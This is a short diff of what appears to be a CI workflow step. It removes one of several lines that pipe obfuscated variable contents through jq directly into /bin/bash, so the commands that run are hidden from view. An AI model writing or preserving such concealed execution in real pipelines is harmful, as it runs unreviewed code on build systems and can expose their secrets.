@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$ocjpj18" | jq -r .knp01 | /bin/bash
           echo $q14834 | jq -r .h8 | /bin/bash
-          printf '%s' "$q8" | jq -r .hx32 | /bin/bash
           echo $ym87 | jq -r .g3 | /bin/bash
 
       - name: Store results
